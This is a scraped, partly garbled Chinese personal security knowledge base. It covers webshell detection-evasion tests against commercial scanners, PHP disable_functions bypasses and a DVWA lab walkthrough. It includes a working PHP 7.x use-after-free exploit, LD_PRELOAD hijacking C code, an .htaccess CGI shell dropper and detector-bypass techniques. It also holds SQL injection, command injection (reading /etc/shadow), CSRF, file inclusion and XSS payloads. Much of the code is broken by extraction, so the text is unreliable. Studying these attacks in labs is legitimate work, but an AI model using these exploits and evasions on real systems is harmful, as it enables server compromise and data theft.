= $s-1; $j >= 0; $j--) { $address >= 8; } return $out; } function write(&$str, $p, $v, $n = 8) { $i = 0; for($i = 0; $i >= 8; } } function leak($addr, $p = 0, $s = 8) { global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper->a); if($s != 8) { $leak %= 2 0 && $leak - $base 0 && $leak - $base a = $arg; } if(stristr(PHP_OS, 'WIN')) { die('This PoC is for *nix systems only.'); } $n_alloc = 10; # increase this value if UAF fails $contiguous = []; for($i = 0; $i b = function ($x) { }; if(strlen($abc) == 79 || strlen($abc) == 0) { die(\"UAF failed\"); } # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) { die(\"Couldn't determine binary base address\"); } if(!($elf = parse_elf($base))) { die(\"Couldn't parse ELF header\"); } if(!($basic_funcs = get_basic_funcs($base, $elf))) { die(\"Couldn't get basic_functions address\"); } if(!($zif_system = get_system($basic_funcs))) { die(\"Couldn't get zif_system address\"); } # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i b)($cmd); exit(); } shell.php 椒图&D盾&河马检测结果 河马 D盾 椒图 椒图&D盾&河马比较 椒图 未知webshell检测情况 已知webshell检测情况 未检测出webshel检测情况 1.php4.php9.php10.php12.php14.php15.phptest_15.php22.php 2.php6.php11.php13.php16.php17.php18.phptest_18.php19.php20.php21.php23.phpshell.php 3.php5s.php7.php8.phptest_6.phptest_7.phpbypass.php 其中椒图未检测出webshell的原理图如下表 webshell 原理 3.php register_shutdown_function ( callable $callback [, [mixed] $parameter [,mixed $... ]] ) : void其中$callback回调函数，它会在脚本执行完之后或者exit()之后执行 5s.php array_intersect_uassoc ( array $array1 , array $array2 [, array $... ],callable $key_compare_func ) : array索引检查计算数组的交集，用回调函数比较索引其中$f 是通过hex2bin 与文件最后一个字符以s 命名结合而成assert，由于php7.1+不可用assert函数，靶机环境7.2，故未成功 7.php array_intersect_ukey ( array $array1 , array $array2 [, array $... ],callable $key_compare_func ) : array用回调函数比较键名来计算数组的交集其中通过HTTP Headers Cookie[set-domain-name]将ass 字符与ert 字符拼接,构成assert 将其构造成回调函数，并利用，由于php7.1+不可用assert函数，靶机环境7.2，故未成功 8.php 同5s.php，只不过是为了绕过文件上传后文件重命名，不能截取对应的字符构成assert ；所以对所有的字符做了一个key,当检索到key 就将其转换，并构成assert test_6.php forward_static_call_array ( callable $function , array $parameters ) : mixed调用function 参数给定的用户定义函数或方法。此函数必须在方法上下文中调用，不能在类外部使用。它使用后期静态绑定。与call_user_func_array()类似,转发的方法的所有参数都作为值和数组传递。其中通过HTTP Headers [Referer],截取(-7,-4)的三个字符 比如http://www.target.com/sys.php截取sys 这个字符与tem 组合构成system test_7.php 同7.php，由于目标靶机php版本为7.2，assert断言无法使用，故改为system()执行系统命令 bypass.php 绕php7.0-7.4中disable_function的poc，且可执行命令 D盾 D盾共检测了28个webshell，分析之后，大概可以知道，D盾对使用回调函数时且在参数或者函数体存在$_POST[]， $_GET[] ， $_REQUEST的检测很严格，当回调函数中或者函数体中出现这些参数则会被检测出来，当回调函数参数或者函数体不存在$_POST[]， $_GET[] ，$_REQUEST 时，则检测为正常。 河马 河马一共检测出12个后门，其中有3个需要人为确定是否为后门，分析之后，大概知道河马的检测规则多数为参数$_POST[]，$_GET[] ，$_REQUEST,变量数，编码风险函数有关；当正常使用php官方的拥有回调函数的方法，则未被检测出来。 总结 通过对椒图的webshell检测能力测试，发现椒图对php内置的安全函数并未严格控制，如register_shutdown_function ， array_intersect_uassoc ， array_intersect_ukey ； 针对5s.php 和8.php ，通过文件名字来构成危险函数并未检测到； 针对6.php , test_6.php ，都是通过截取HTTP_REFERER 的字符串，拼接危险函数assert , system ,按理来说， test_6.php 也应该能检测到，但是未检测出来，如果是因为， system 这6个敏感字符不存在检测规则中，建议及时添加，并监控http头部是否有奇怪的字符并能拼接成字符串； 针对7.php , test_7.php ，都是通过截取$_COOKIE[\"set-domain-name\"] 中的字符串，来拼接成危险函数； 最后对于bypass.php ,是之前学习bypass disable function 的时候在github上找到的一个用来绕php7.0-php7.4的通用型脚本，测试在apache，nginx 两个web容器上能稳定运行。（暂时还未吃透该poc） webshell检测（开启rasp） 上传1.php - 29.php 由于开启了应用防护，会将已知webshell，未知webshell隔离，所以不部分已知webshell，未知webshell都会被隔离，当全部上传成功之后，上传文件列表如图所示： 3.php test_6.php test_7.php bypass.php 椒图检测情况 可以看到，反弹shell的敏感操作，都能被捕获，但是蚁剑在未编码的情况下，成功连接，未被检测到。 当存在如下的敏感操作，webshell并未被隔离 Bug1 同一马不同名未隔离 上传同一个马，改变文件名称，使用burp的Intruder模块枚举上传如666a.php , 777a.php 未受影响，可以上传成功，当执行了敏感操作，椒图才能检测到，再杀马，但是在检测到敏感操作之前，其实就已经可以执行系统命令反弹shell了 同1.php 服务端执行结果 url编码之后，反弹shell 当反弹时shell成功之后，再去查看文件是否已删除，发现777a.php 并未删除，当手动删除之后，再上传这个马，就传不上去了（椒图显示为检测到已知webshell）,推测当检测为未知webshell时，存在误差，会判断是否进行敏感操作，因此进行隔离。 Bug 2 条件竞争 利用burp枚举上传类似1.php 的可执行php系统函数如system() ，形成条件竞争，当来不及隔离webshell之前，反弹shell可成功 bug分析： 隔离存在时间差，当高并发上传webshell的时候，服务器应该考虑是否是脚本攻击，对脚本攻击的大量的请求，应该及时封掉ip Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 23:05:18 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/10.webshell原理.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/11.ByPaass_disable_Function.html":{"url":"知识库/01.WEB安全/11.其他/11.ByPaass_disable_Function.html","title":"11.ByPaass_disable_Function","keywords":"","body":" PHP内置系统执行函数 LD_PRELOAD绕过 EXP-1 EXP-2 EXP-3 .htaccess 不止重定向绕过 EXP PHP特定版本bypass Target EXP Bug: https://bugs.php.net/bug.php?id=76047 This exploit should work on all PHP 7.0-7.4 versions Author: https://github.com/mm0r1 PHP ByPass Disbale_Function 在获取一枚webshell的时候，尝试命令执行，却发现无法执行命令，那么就是php.ini中设置了disable_functions PHP内置系统执行函数 system() string system ( string $command [, int &$return_var ] ); # $command为执行的命令，&return_var可选，用来存放命令执行后的状态码 # system 函数执行有回显，可将结果显示在页面上 passthru() void passthru ( string $command [, int &$return_var ] ); # 和system函数类似，$command为执行的命令，&return_var可选，用来存放命令执行后的状态码 # passthru 执行有回显，可将执行结果显示在页面上 exec() string exec ( string $command [, array &$output [, int &$return_var ]] ); # $command是要执行的命令 # $output是获得执行命令输出的每一行字符串，$return_var用来保存命令执行的状态码（检测成功或失败） # exec()函数执行无回显，默认返回最后一行结果 shell_exec() string shell_exec( string &command); # $command是要执行的命令 # shell_exec()函数默认无回显，通过 echo 可将执行结果输出到页面 # `(反引号) shell_exec() 函数实际上仅是反引号 (`) 操作符的变体，当禁用shell_exec时，` 也不可执行 # 在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回 popen() resource popen ( string $command , string $mode ); # 函数需要两个参数，一个是执行的命令command，另外一个是指针文件的连接模式mode，有r和w代表读和写。函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行。popen()打开一个指向进程的管道，该进程由派生给定的command命令执行而产生。返回一个和fopen()所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用pclose()来关闭。此指针可以用于fgets()，fgetss()和 fwrite() shell.php 反弹shell proc_open() resource proc_open ( string $cmd , array $descriptorspec , array &$pipes [, string $cwd [, array $env [, array $other_options ]]] ); # 与Popen函数类似，但是可以提供双向管道 shell.php 反弹shell pcntl_exec() void pcntl_exec ( string $path [, array $args [, array $envs ]] ) path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 args是一个要传递给程序的参数的字符串数组。 pcntl是linux下的一个扩展，需要额外安装，可以支持 php 的多线程操作。 pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP > 4.2.0 LD_PRELOAD绕过 LD_PRELOAD是linux系统下的环境变量，它允许你在定义程序运行前优先加载动态链接库，这个功能只要是用来有选择性的载入不同的不同动态链接库的中的相同函数。通过这个环境变量，可以在主程序和其他动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面可以使用自己的或是更好的的函数（无需别人的源码），而另一方面，我们也可以向别人的程序注入程序，从而达到特定的目的。 找寻内部启动新进程的 PHP 函数。虽然 LD_PRELOAD 提供了劫持系统函数的能力，但前提是必须得控制 php 启动外部程序才行（只要有进程启动行为即可，无所谓是谁） ，经过探索可以知道php中的mail()函数调用之后会启动sendmail这个进程。 运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于 LD_PRELOAD 的作用，sendmail 调用的系统函数 geteuid() 被优先级更好的 geteuid_shadow.so 中的同名 geteuid() 所劫持。 EXP-1 动态链接库C脚本 #define _GNU_SOURCE #include #include #include extern char** environ; int geteuid () { const char* cmdline = \"whoami > /var/www/html/test.txt\" int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], \"LD_PRELOAD\")) { environ[i][0] = '\\0'; } } system(cmdline); } php脚本 将劫持代码编译成动态链接库 ,若目标为 x86 架构，需要加上 -m32 选项重新编译 gcc -fPIC -shared test.c -o test.so 分别将动态库test.so文件，php脚本test.php上传到服务器中，再访问test.php脚本文件，如果成功将geteuid函数劫持，那么将会把whoami命令结果重定向在/var/www/html/test.txt文件中 在真实环境中，存在两方面问题：一是，某些环境中，web 禁止启用 sendmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1 lamp、lamp.、lamp.com）。基于这两个原因，不得不放弃劫持函数 geteuid()，必须找个更实用的方法。回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那就完全可以不依赖 sendmail 了。 GCC 有个 C 语言扩展修饰符 __attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute__((constructor)) 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为 此外，通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 unsetenv(\"LD_PRELOAD\")，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，我得找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 extern char** environ！实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。 EXP-2 动态链接库C脚本 #define _GNU_SOURCE #include #include #include extern char** environ; __attribute__ ((__constructor__)) void preload (void) { // get command line options and arg const char* cmdline = getenv(\"EVIL_CMDLINE\"); // unset environment variable LD_PRELOAD. // unsetenv(\"LD_PRELOAD\") no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], \"LD_PRELOAD\")) { environ[i][0] = '\\0'; } } // executive command system(cmdline); } \" . $out_path . \" 2>&1\"; echo \" cmdline: \" . $evil_cmdline . \"\"; putenv(\"EVIL_CMDLINE=\" . $evil_cmdline); $so_path = $_GET[\"sopath\"]; putenv(\"LD_PRELOAD=\" . $so_path); mail(\"\", \"\", \"\", \"\"); echo \" output: \" . nl2br(file_get_contents($out_path)) . \"\"; unlink($out_path); ?> 首先先编译c脚本为动态链接库 gcc -fPIC -shared hack.c -o hack.so 分别将动态库hack.so文件，php脚本hack.php上传到服务器中，再访问hack.php脚本文件，并带上参数cmd(待执行的命令)，outpath(结果重定向文件位置),sopath(加载动态链接库的位置) EXP-3 error_log + putenv error_log(error,type,destination,headers) ， 当type为1时，服务器就会把error发送到参数 destination 设置的邮件地址 error_log(\"test\", 1, \"\", \"\"); .htaccess 不止重定向绕过 在apache的WEB环境中，经常会使用.htaccess这个文件来确定某个目录下的URL重写规则， 但是如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令 “任何具有mime类型application/x-httpd-cgi或者被 cgi-script处理器(Apache 1.1或以后版本)处理的文件将被作为CGI脚本对待并由服务器运行, 它的输出将被返回给客户端。通过两种途径使文件成为CGI脚本，或者文件具有已由 AddType指令定义的扩展名，或者文件位于 ScriptAlias目录中。” 首先需要满足几个条件， 必须是apache环境 mod_cgi已经启用 必须允许.htaccess文件，也就是说在httpd.conf(apache2.conf)中，要注意AllowOverride选项为All，而不是none 必须有权限写.htaccess文件 在apache的配置中，有一个非常重要的指令，Options，Options指令是Apache配置文件中一个比较常见也比较重要的指令，Options指令可以在Apache服务器核心配置(server config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用 Options指令是Apache配置文件中一个比较常见也比较重要的指令，Options指令可以在Apache服务器核心配置(server config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用, 允许使用mod_cgi模块执行CGI脚本那么用到的就是ExecCGI选项， AddHandler是指定扩展名和处理程序之间的关系，也就是说，可以指定某个特定的扩展名的文件，如何来进行处理 有了Options和AddHandler，我们就可以随便指定一个特定的文件扩展名以特定的程序来处理，这样思路就很清晰了：先把要执行的程序写入一个特定扩展名的文件里，然后修改.htaccess文件，通过Options指令允许使用mod_cgi模块执行CGI脚本，然后再让我们特定的扩展名以cgi-script进行处理，这样我们甚至可以反弹一个shell出来。 EXP \\n\"; } if(!isset($_GET['checked'])) { @file_put_contents('.htaccess',\"\\nSetEnv HTACCESS on\", FILE_APPEND); header('Location: ' . $_SERVER['PHP_SELF']. '?checked=true'); //执行环境的检查 } else { $modcgi = in_array('mod_cgi',apache_get_modules()); // 检测mod_cgi是否开启 $writable = is_writable('.'); //检测当前目录是否可写 $htaccess = !empty($_SERVER['HTACCESS']);//检测是否启用了.htaccess checkEnabled(\"Mod-Cgienabled\",$modcgi,\"Yes\",\"No\"); checkEnabled(\"Iswritable\",$writable,\"Yes\",\"No\"); checkEnabled(\"htaccessworking\",$htaccess,\"Yes\",\"No\"); if(!($modcgi && $writable&& $htaccess)) { echo \"Error. All of the above mustbe true for the script to work!\"; //必须满足所有条件 } else { checkEnabled(\"Backing up.htaccess\",copy(\".htaccess\",\".htaccess.bak\"),\"Suceeded!Saved in .htaccess.bak\",\"Failed!\"); //备份一下原有.htaccess checkEnabled(\"Write .htaccessfile\",file_put_contents('.htaccess',\"Options +ExecCGI\\nAddHandler cgi-script .dizzle\"),\"Succeeded!\",\"Failed!\");//.dizzle，我们的特定扩展名 checkEnabled(\"Write shellfile\",file_put_contents('shell.dizzle',$shellfile),\"Succeeded!\",\"Failed!\");//写入文件 checkEnabled(\"Chmod777\",chmod(\"shell.dizzle\",0777),\"Succeeded!\",\"Failed!\");//给权限 echo \"Executing the script now.Check your listener. \"; } } ?> PHP特定版本bypass Target 7.0 - all versions to date 7.1 - all versions to date 7.2 - all versions to date 7.3 7.4 EXP a); $backtrace = (new Exception)->getTrace(); # ;) if(!isset($backtrace[1]['args'])) { # PHP >= 7.4 $backtrace = debug_backtrace(); } } } class Helper { public $a, $b, $c, $d; } function str2ptr(&$str, $p = 0, $s = 8) { $address = 0; for($j = $s-1; $j >= 0; $j--) { $address >= 8; } return $out; } function write(&$str, $p, $v, $n = 8) { $i = 0; for($i = 0; $i >= 8; } } function leak($addr, $p = 0, $s = 8) { global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper->a); if($s != 8) { $leak %= 2 0 && $leak - $base 0 && $leak - $base a = $arg; } if(stristr(PHP_OS, 'WIN')) { die('This PoC is for *nix systems only.'); } $n_alloc = 10; # increase this value if UAF fails $contiguous = []; for($i = 0; $i b = function ($x) { }; if(strlen($abc) == 79 || strlen($abc) == 0) { die(\"UAF failed\"); } # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) { die(\"Couldn't determine binary base address\"); } if(!($elf = parse_elf($base))) { die(\"Couldn't parse ELF header\"); } if(!($basic_funcs = get_basic_funcs($base, $elf))) { die(\"Couldn't get basic_functions address\"); } if(!($zif_system = get_system($basic_funcs))) { die(\"Couldn't get zif_system address\"); } # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i b)($cmd); exit(); } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 22:39:43 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/11.ByPaass_disable_Function.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/12.DVWA通关记录.html":{"url":"知识库/01.WEB安全/11.其他/12.DVWA通关记录.html","title":"12.DVWA通关记录","keywords":"","body":" BRUTE Force（爆库） Command Injection CSRF File Inclusion File upload SQL Injection SQL Injection (Blind) XSS（ Reflected） XSS（Stored） Medium BRUTE Force（爆库） Command Injection CSRF File Inclusion File upload SQL Injection SQL Injection (Blind) XSS（ Reflected） XSS（Stored） High BRUTE Force（爆库） Command Injection CSRF File Inclusion upload SQL Injection SQL Injection (Blind) XSS（ Reflected） XSS（Stored） DVWS 通关指南 LOW BRUTE Force（爆库） ' . mysql_error() . '' ); if( $result && mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, \"avatar\" ); // Login successful echo \"Welcome to the password protected area {$user}\"; echo \"\"; } else { // Login failed echo \"Username and/or password incorrect.\"; } mysql_close(); } ?> 分析代码，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username，password，没有做任何过滤就直接带入数据库查询，并没有做相关的处理，所以可以尝试万能密码登录 万能密码 username = admin'# password = all username = admin' or '1'='1 password = all burp爆破，top 500_user,top100_password 尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。 Command Injection 命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞 {$cmd}\"; } ?> 相关函数介绍 stristr(string,search,before_search) stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的ASCII值的字符），可选参数before_true为布尔型，默认为“false”，如果设置为“true”，函数将返回search参数第一次出现之前的字符串部分。 php_uname(mode) 这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。 可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞 漏洞利用 window和linux系统都可以用&&来执行多条命令 127.0.0.1&&net user 127.0.0.1&&cat /etc/shadow 127.0.0.1&& whoami CSRF CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等） ' . mysql_error() . '' ); // Feedback for the user echo \"Password Changed.\"; } else { // Issue with passwords matching echo \"Passwords did not match.\"; } mysql_close(); } ?> 可以看到，服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现）。 漏洞利用 使用burp抓包，可以看到请求中包含了修改密码 1.将url copy下来 http://192.168.124.131/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change 当受害者点击了这个链接，他的密码就会被改成password（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了） 需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用火狐浏览器点击这个链接，攻击是不会触发的，因为火狐浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。 2.短链接 可以使用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）：http://mrw.so/4NnRyv 虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明 3.构造攻击页面 使用burp抓包之后，使用Generate CSRF POC 功能，可以生成简单的HTML代码，如下 但是此代码打开效果就一个button，需要点击才会触发，如果点击之后，那么受害者也会发现自己的密码被更改了，所以此方法只是用来测试是否存在CSRF，在得知请求之后可以使用如img，body标签，直接请求 404 您访问的页面不存在 --> 404 您访问的页面不存在 --> 404 您访问的页面不存在 function getCSRF(){ var img = document.createElement('img') img.src = 'http://192.168.124.131/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change' img.style.display = 'none' document.body.appendChild(img) } File Inclusion File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件） 可以看到，服务器端对page参数没有做任何的过滤和检查。 服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。 漏洞利用 1.本地文件包含 构造url http://192.168.124.131/vulnerabilities/fi/?page=/etc/passwd 成功读取/etc/passwd文件 由于环境是在docker中，shadow是 rw-r-----，当前不是root用户，所以修改权限 644 就可以读取shadow文件 2.远程文件包含 当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。在远程服务器192.168.124.1上传一个info.txt文件，内容如下 构造url为 http://192.168.124.131/vulnerabilities/fi/?page=http://192.168.124.1/upload/upload/info.txt 成功在服务器上执行了phpinfo函数 为了增强隐蔽性可以对 http://192.168.124.1/upload/upload/info.txt进行编码 http://192.168.124.131/vulnerabilities/fi/?page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%32%34%2e%31%2f%75%70%6c%6f%61%64%2f%75%70%6c%6f%61%64%2f%69%6e%66%6f%2e%74%78%74 File upload 文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞 Your image was not uploaded.'; } else { // Yes! echo \"{$target_path} succesfully uploaded!\"; } } ?> basename(path,suffix) 函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。 可以看到文件上传没有做任何限制，可以上传任何文件，上传一句话拿到webshell 使用蚁剑直接连接，口令为Cknife，然后蚁剑就会通过向服务器发送包含Cknife参数的post请求，在服务器上执行任意命令，获取webshell权限。可以下载、修改服务器的所有文件 SQL Injection SQL注入,是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一 1.判断是否存在注入，注入是字符型还是数字型 2.猜解SQL查询语句中的字段数 3.确定显示的字段顺序 4.获取当前数据库 5.获取数据库中的表 6.获取表中的字段名 7.下载数据 ' . mysql_error() . '' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i ID: {$id}First name: {$first}Surname: {$last}\"; // Increase loop count $i++; } mysql_close(); } ?> 查看源码，发现注入点是id，并且是字符型注入，服务端接收id参数，没有做任何处理，并且有回显，和报错详情，可以使用联合查询和报错注入以及时间盲注来实现手工注入 union order by 猜列数 paylod： 1' order by 2# 爆当前库，版本信息 payload: -1' union select database(),version()# 爆库 payload: -1' union select 1,group_concat(schema_name) from information_schema.schemata# 爆表 payload: -1' union select 1,group_concat(table_name) from information_schema.tables where table_schema = database()# 爆列 payload: -1' union select 1,group_concat(column_name) from information_schema.columns where table_name = 'users'# 报错注入 updatexml() payload: 1' and updatexml(1,concat(0x23,database()),1)# payload: 1' and updatexml(1,concat(0x23,(select table_name from information_schema.tables where table_schema = database() limit 1 offset 0)),1)# extractvalue() payload: 1' and extractvalue(1,concat(0x23,database()))# payload: 1' and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema = database() limit 1 offset 0)))# floor payload: 1' and (SELECT 1 from (SELECT count(*),concat(0x23, database(), 0x23,floor(rand(0)*2)) as x from information_schema.`COLUMNS` GROUP BY x) as y)# payload: 1' and (SELECT 1 from (SELECT count(*),concat(0x23, (select table_name from information_schema.tables where table_schema = database() limit 0,1), 0x23,floor(rand(0)*2)) as x from information_schema.`COLUMNS` GROUP BY x) as y)# 时间盲注 payload: 1' and if(1=1,sleep(2),0)# payload: 1' and if(ascii(substr(database(),1,1))SQL Injection (Blind) 0 ) { // Feedback for end user echo 'User ID exists in the database.'; } else { // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo 'User ID is MISSING from the database.'; } mysql_close(); } ?> 基于布尔盲注需要页面有回显，此时当页面查询出正确的值，$num>0,则是正确的回显，User ID exists in the database. 否则则是错误的回显，说明sql查询不存在回显为User ID is MISSING from the database 布尔盲注 payload: 1' and ascii(substr(database(),1,1))时间盲注 payload: 1' and if(1=1,sleep(2),1)# payload: 1' and if(1=2,sleep(2),1)# XSS（ Reflected） Hello ' . $_GET[ 'name' ] . ''; } ?> 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞(反射型XSS) 在input框输入 alert('123') 可以构造url为 http://192.168.124.131/vulnerabilities/xss_r/?name=alert('xss') 对参数name进行url编码 http://192.168.124.131/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%27%78%73%73%27%29%3c%2f%73%63%72%69%70%74%3e XSS（Stored） ' . mysql_error() . '' ); //mysql_close(); } ?> 相关函数介绍 trim(string,charlist)函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\\t、\\n、\\x0B、\\r以及空格，可选参数charlist支持添加额外需要删除的字符 mysql_real_escape_string(string,connection)函数会对字符串中的特殊符号（\\x00，\\n，\\r，\\，‘，“，\\x1a）进行转义 stripslashes(string)函数删除字符串中的反斜杠 可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞 message一栏输入alert(/xss/)，成功弹框： name一栏前端有字数限制，抓包改为alert(/name/) 成功弹框 Medium BRUTE Force（爆库） ' . mysql_error() . '' ); if( $result && mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, \"avatar\" ); // Login successful echo \"Welcome to the password protected area {$user}\"; echo \"\"; } else { // Login failed sleep( 2 ); echo \"Username and/or password incorrect.\"; } mysql_close(); } ?> 相比Low级别的代码，Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击，说基本上是因为查到说 MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义（因实验环境的MySQL版本较新，所以并未做相应验证）；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，依然没有加入有效的防爆破机制（sleep(2)实在算不上） 和Low级别一致，使用burp爆破，采用usernametop_500和passwordtop_100的字典 Command Injection '', ';' => '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd 